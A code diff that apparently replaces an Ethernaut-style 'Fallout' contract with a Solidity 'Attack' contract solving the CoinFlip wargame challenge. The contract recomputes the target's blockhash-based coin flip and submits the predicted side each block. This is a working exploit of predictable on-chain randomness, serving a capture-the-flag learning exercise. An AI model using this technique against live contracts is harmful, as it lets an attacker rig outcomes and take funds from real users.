@@ -2,46 +2,30 @@
 pragma solidity ^0.8.0;
 
 import '@openzeppelin/contracts/utils/math/SafeMath.sol';
+import "./CoinFlip.sol";
 
 contract Attack {
-  
+
   using SafeMath for uint256;
-  mapping (address => uint) allocations;
-  address payable public owner;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  CoinFlip coinflip;
 
-
-  /* constructor */
-  function Fal1out() public payable {
-    owner = payable(msg.sender);
-    allocations[owner] = msg.value;
+  constructor(CoinFlip _coinflip) {
+    coinflip = _coinflip;
   }
 
-  function getOwner() public view returns (address) {
-    return owner;
-  }
+  function flip() public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
 
-  modifier onlyOwner {
-	        require(
-	            msg.sender == owner,
-	            "caller is not the owner"
-	        );
-	        _; 
-	    }
+    if (lastHash == blockValue) {
+      revert();
+    }
 
-  function allocate() public payable {
-    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
-  }
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
 
-  function sendAllocation(address payable allocator) public {
-    require(allocations[allocator] > 0);
-    allocator.transfer(allocations[allocator]);
-  }
-
-  function collectAllocations() public onlyOwner {
-    payable(msg.sender).transfer(address(this).balance);
-  }
-
-  function allocatorBalance(address allocator) public view returns (uint) {
-    return allocations[allocator];
+    return coinflip.flip(side);
   }
 }
